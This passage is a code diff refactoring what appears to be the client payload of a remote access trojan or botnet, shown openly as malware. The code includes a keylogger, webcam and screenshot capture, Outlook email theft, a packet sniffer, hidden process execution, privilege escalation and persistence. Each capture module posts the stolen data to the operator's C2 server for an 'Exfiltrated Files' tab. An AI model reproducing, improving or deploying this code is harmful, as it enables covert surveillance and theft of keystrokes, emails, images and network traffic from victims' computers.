+            return "Upload complete (see Exfiltrated Files tab to download file)"
         except Exception as e:
-            log("{} error: {}".format(self.upload.__name__, str(e)))
-            return "Error: {}".format(str(e))
+            log(f"{self.upload.__name__} error: {str(e)}")
+            return f"Error: {str(e)}"
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='webcam <mode> [options]')
@@ -1937,12 +1988,12 @@ class Payload():
             elif 'image' in args:
                 data = globals()['webcam'].image(*args)
                 json_data = {"data": str(data), "type": "png", "owner": self.owner, "module": self.webcam.__name__, "session": self.info.get('public_ip')}
-                
+
                 # upload data to server
                 if self.gui:
-                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
+                    globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                 else:
-                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                    globals()['post'](f'http://{host}:{port + 3}', json=json_data)
 
             elif 'video' in args:
                 data = globals()['webcam'].video(*args)
@@ -1950,15 +2001,15 @@ class Payload():
 
                 # upload data to server
                 if self.gui:
-                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
+                    globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                 else:
-                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                    globals()['post'](f'http://{host}:{port + 3}', json=json_data)
 
             else:
                 return self.webcam.usage
             return "Webcam capture complete  (see Exfiltrated Files tab to download file)"
         except Exception as e:
-            log("{} error: {}".format(self.webcam.__name__, str(e)))
+            log(f"{self.webcam.__name__} error: {str(e)}")
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='passive')
@@ -1967,7 +2018,7 @@ class Payload():
         Keep client alive while waiting to re-connect
 
         """
-        log("{} : Bot entering passive mode awaiting C2.".format(self.passive.__name__))
+        log(f"{self.passive.__name__} : Bot entering passive mode awaiting C2.")
         self.flags.connection.clear()
         self.flags.passive.set()
 
@@ -1979,12 +2030,12 @@ class Payload():
 
         """
         try:
-            log("{} failed - restarting in 3 seconds...".format(output))
+            log(f"{output} failed - restarting in 3 seconds...")
             self.kill()
             time.sleep(3)
             os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
         except Exception as e:
-            log("{} error: {}".format(self.restart.__name__, str(e)))
+            log(f"{self.restart.__name__} error: {str(e)}")
 
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
@@ -2000,41 +2051,41 @@ class Payload():
             self.load('outlook')
         elif not args:
             try:
-                if not globals()['outlook'].installed():
-                    return "Error: Outlook not installed on this host"
-                else:
-                    return "Outlook is installed on this host"
+                return (
+                    "Outlook is installed on this host"
+                    if globals()['outlook'].installed()
+                    else "Error: Outlook not installed on this host"
+                )
+
             except: pass
         else:
             try:
                 mode, _, arg   = str(args).partition(' ')
-                if hasattr(globals()['outlook'], mode):
-
-                    if 'run' in mode:
-                        self.handlers['outlook'] = globals()['outlook'].run()
-                        return "Fetching emails from Outlook inbox..."
-
-                    elif 'upload' in mode:
-                        results = globals()['outlook'].results
-                        if len(results):
-                            host, port = self.connection.getpeername()
-                            data = base64.b64encode(json.dumps(results))
-                            json_data = {'data': str(data), 'type': 'txt', 'owner': self.owner, "module": self.outlook.__name__, "session": self.info.get('public_ip')}
-                
-                            # upload data to server
-                            if self.gui:
-                                globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
-                            else:
-                                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)                            
-                            return "Upload of Outlook emails complete  (see Exfiltrated Files tab to download files)"
-                    elif hasattr(globals()['outlook'], mode):
-                        return getattr(globals()['outlook'], mode)()
-                    else:
-                        return "Error: invalid mode '%s'" % mode
-                else:
+                if not hasattr(globals()['outlook'], mode):
                     return self.outlook.usage
+                if 'run' in mode:
+                    self.handlers['outlook'] = globals()['outlook'].run()
+                    return "Fetching emails from Outlook inbox..."
+
+                elif 'upload' in mode:
+                    results = globals()['outlook'].results
+                    if len(results):
+                        host, port = self.connection.getpeername()
+                        data = base64.b64encode(json.dumps(results))
+                        json_data = {'data': str(data), 'type': 'txt', 'owner': self.owner, "module": self.outlook.__name__, "session": self.info.get('public_ip')}
+
+                            # upload data to server
+                        if self.gui:
+                            globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
+                        else:
+                            globals()['post'](f'http://{host}:{port + 3}', json=json_data)
+                        return "Upload of Outlook emails complete  (see Exfiltrated Files tab to download files)"
+                elif hasattr(globals()['outlook'], mode):
+                    return getattr(globals()['outlook'], mode)()
+                else:
+                    return "Error: invalid mode '%s'" % mode
             except Exception as e:
-                log("{} error: {}".format(self.email.__name__, str(e)))
+                log(f"{self.email.__name__} error: {str(e)}")
 
 
     @config(platforms=['win32'], command=True, usage='escalate')
@@ -2048,7 +2099,7 @@ class Payload():
                 self.load('escalate')
             return globals()['escalate'].run(sys.argv[0])
         except Exception as e:
-            log("{} error: {}".format(self.escalate.__name__, str(e)))
+            log(f"{self.escalate.__name__} error: {str(e)}")
 
 
     @config(platforms=['win32','linux','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
@@ -2066,25 +2117,24 @@ class Payload():
         log(args)
         path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
         args = [path] + args.split()
-        if os.path.isfile(path):
-            name = os.path.splitext(os.path.basename(path))[0]
-            try:
-                # attempt to run hidden process
-                info = subprocess.STARTUPINFO()
-                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
-                info.wShowWindow = subprocess.SW_HIDE
-                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
-                return "Running '{}' in a hidden process".format(path)
-            except Exception as e:
+        if not os.path.isfile(path):
+            return f"File '{str(path)}' not found"
+        name = os.path.splitext(os.path.basename(path))[0]
+        try:
+            # attempt to run hidden process
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
+            info.wShowWindow = subprocess.SW_HIDE
+            self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
+            return f"Running '{path}' in a hidden process"
+        except Exception as e:
                 # revert to normal process if hidden process fails
-                try:
-                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
-                    return "Running '{}' in a new process".format(name)
-                except Exception as e:
-                    log("{} error: {}".format(self.execute.__name__, str(e)))
-                    return "{} error: {}".format(self.execute.__name__, str(e))
-        else:
-            return "File '{}' not found".format(str(path))
+            try:
+                self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                return f"Running '{name}' in a new process"
+            except Exception as e:
+                log(f"{self.execute.__name__} error: {str(e)}")
+                return f"{self.execute.__name__} error: {str(e)}"
 
 
     @config(platforms=['win32'], command=True, usage='process <mode>')
@@ -2106,27 +2156,26 @@ class Payload():
                 cmd, _, action = str(args).partition(' ')
                 if 'monitor' in cmd:
                     self.handlers['process_monitor'] = globals()['process'].monitor(action)
-                    return "Monitoring process creation for keyword: {}".format(action)
+                    return f"Monitoring process creation for keyword: {action}"
                 elif 'upload' in cmd:
                     log = globals()['process'].log.getvalue()
-                    if len(log):
-                        host, port = self.connection.getpeername()
-                        data = base64.b64encode(log)
-                        json_data = {'data': str(data), 'type': 'log', 'owner': self.owner, "module": self.process.__name__, "session": self.info.get('public_ip')}
-            
-                        # upload data to server
-                        if self.gui:
-                            globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
-                        else:
-                            globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
-                        return "Process log upload complete  (see Exfiltrated Files tab to download file)"
-                    else:
+                    if not len(log):
                         return "Process log is empty"
+                    host, port = self.connection.getpeername()
+                    data = base64.b64encode(log)
+                    json_data = {'data': str(data), 'type': 'log', 'owner': self.owner, "module": self.process.__name__, "session": self.info.get('public_ip')}
+
+                        # upload data to server
+                    if self.gui:
+                        globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
+                    else:
+                        globals()['post'](f'http://{host}:{port + 3}', json=json_data)
+                    return "Process log upload complete  (see Exfiltrated Files tab to download file)"
                 elif hasattr(globals()['process'], cmd):
                     return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
             return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
-            log("{} error: {}".format(self.process.__name__, str(e)))
+            log(f"{self.process.__name__} error: {str(e)}")
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='portscanner <target>')
@@ -2142,14 +2191,16 @@ class Payload():
         if 'portscanner' not in globals():
             self.load('portscanner')
         try:
-            if target:
-                if not ipv4(target):
-                    return "Error: invalid IP address '%s'" % target
-                return globals()['portscanner'].run(target)
-            else:
+            if not target:
                 return self.portscanner.usage
+            return (
+                globals()['portscanner'].run(target)
+                if ipv4(target)
+                else "Error: invalid IP address '%s'" % target
+            )
+
         except Exception as e:
-            log("{} error: {}".format(self.portscanner.__name__, str(e)))
+            log(f"{self.portscanner.__name__} error: {str(e)}")
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='keylogger [mode]')
@@ -2167,45 +2218,47 @@ class Payload():
                 return "Log size: {} bytes".format(length)
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
+
         if 'keylogger' not in globals():
             self.load('keylogger')
         if not mode:
+            return (
+                globals()['keylogger'].usage
+                if 'keylogger' not in self.handlers
+                else locals()['status']()
+            )
+
+        if 'run' in mode or 'start' in mode:
             if 'keylogger' not in self.handlers:
-                return globals()['keylogger'].usage
+                self.handlers['keylogger'] = globals()['keylogger'].run()
+                return locals()['status']()
             else:
                 return locals()['status']()
+        elif 'stop' in mode:
+            try:
+                self.stop('keylogger')
+            except: pass
+            try:
+                self.stop('keylogger')
+            except: pass
+            return locals()['status']()
+        elif 'upload' in mode:
+            host, port = self.connection.getpeername()
+            data = base64.b64encode(globals()['keylogger'].logs.getvalue())
+            json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}
+
+            # upload data to server
+            if self.gui:
+                globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
+            else:
+                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+
+            globals()['keylogger'].logs.reset()
+            return 'Keystroke log upload complete  (see Exfiltrated Files tab to download file)'
+        elif 'status' in mode:
+            return locals()['status']()
         else:
-            if 'run' in mode or 'start' in mode:
-                if 'keylogger' not in self.handlers:
-                    self.handlers['keylogger'] = globals()['keylogger'].run()
-                    return locals()['status']()
-                else:
-                    return locals()['status']()
-            elif 'stop' in mode:
-                try:
-                    self.stop('keylogger')
-                except: pass
-                try:
-                    self.stop('keylogger')
-                except: pass
-                return locals()['status']()
-            elif 'upload' in mode:
-                host, port = self.connection.getpeername()
-                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
-                json_data = {'data': str(data), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('public_ip')}
-
-                # upload data to server
-                if self.gui:
-                    globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
-                else:
-                    globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
-
-                globals()['keylogger'].logs.reset()
-                return 'Keystroke log upload complete  (see Exfiltrated Files tab to download file)'
-            elif 'status' in mode:
-                return locals()['status']()
-            else:
-                return self.keylogger.usage
+            return self.keylogger.usage
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='screenshot')
@@ -2224,12 +2277,12 @@ class Payload():
             data = globals()['screenshot'].run()
             json_data = {"data": str(data), "owner": self.owner, "type": "png", "module": self.screenshot.__name__, "session": self.info.get('public_ip')}
             if self.gui:
-                globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
+                globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
             else:
-                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                globals()['post'](f'http://{host}:{port + 3}', json=json_data)
             return 'Screenshot complete  (see Exfiltrated Files tab to download file)'
         except Exception as e:
-            result = "{} error: {}".format(self.screenshot.__name__, str(e))
+            result = f"{self.screenshot.__name__} error: {str(e)}"
             log(result)
             return result
 
@@ -2253,20 +2306,20 @@ class Payload():
 
         """
         try:
-            if not 'persistence' in globals():
+            if 'persistence' not in globals():
                 self.load('persistence')
             cmd, _, action = str(args).partition(' ')
             if cmd not in ('add','remove'):
                 return self.persistence.usage
             for method in globals()['persistence']._methods:
-                if action == 'all' or action == method:
+                if action in ['all', method]:
                     try:
                         getattr(globals()['persistence']._methods[method], cmd)()
                     except Exception as e:
-                        log("{} error: {}".format(self.persistence.__name__, str(e)))
+                        log(f"{self.persistence.__name__} error: {str(e)}")
             return json.dumps(globals()['persistence'].results())
         except Exception as e:
-            log("{} error: {}".format(self.persistence.__name__, str(e)))
+            log(f"{self.persistence.__name__} error: {str(e)}")
 
 
     @config(platforms=['linux','linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
@@ -2293,24 +2346,23 @@ class Payload():
                     return "Network traffic captured stopped"
                 elif 'upload' in mode:
                     log = globals()['packetsniffer'].log.getvalue()
-                    if len(log):
-                        globals()['packetsniffer'].log.reset()
-                        host, port = self.connection.getpeername()
-                        data = base64.b64encode(log)
-                        json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
+                    if not len(log):
+                        return "Network traffic log is empty"
+                    globals()['packetsniffer'].log.reset()
+                    host, port = self.connection.getpeername()
+                    data = base64.b64encode(log)
+                    json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
 
                         # upload data to server
-                        if self.gui:
-                            globals()['post']('http://{}:5000/api/file/add'.format(host), data=json_data)
-                        else:
-                            globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
-                        return "Network traffic log upload complete (see Exfiltrated Files tab to download file)"
+                    if self.gui:
+                        globals()['post'](f'http://{host}:5000/api/file/add', data=json_data)
                     else:
-                        return "Network traffic log is empty"
+                        globals()['post'](f'http://{host}:{port + 3}', json=json_data)
+                    return "Network traffic log upload complete (see Exfiltrated Files tab to download file)"
                 else:
                     return self.packetsniffer.usage
         except Exception as e:
-            log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
+            log(f"{self.packetsniffer.__name__} error: {str(e)}")
 
     def send_task(self, task):
         """
@@ -2328,7 +2380,7 @@ class Payload():
 
         """
         try:
-            if not 'session' in task:
+            if 'session' not in task:
                 task['session'] = self.info.get('uid')
             if self.flags.connection.wait(timeout=1.0):
                 data = globals()['encrypt_aes'](json.dumps(task), self.key)
@@ -2339,15 +2391,27 @@ class Payload():
         except Exception as e:
             e = str(e)
             if "Errno 104" in e or "10054" in e:
-                log("{} socket error: SERVER DISCONNECTED GRACEFULLY - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER DISCONNECTED GRACEFULLY - {e}"
+                )
+
                 self.kill()
                 return
             elif "Errno 32" in e or "10052" in e:
-                log("{} socket error: SERVER CRASHED OR INTERRUPTED - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER CRASHED OR INTERRUPTED - {e}"
+                )
+
             elif "Errno 111" in e or "10061" in e:
-                log("{} socket error: SERVER OFFLINE OR CHANGED PORT - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER OFFLINE OR CHANGED PORT - {e}"
+                )
+
             else:
-                log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {e}"
+                )
+
             self.passive()
             #log("{} error: {}".format(self.send_task.__name__, str(e)))
 
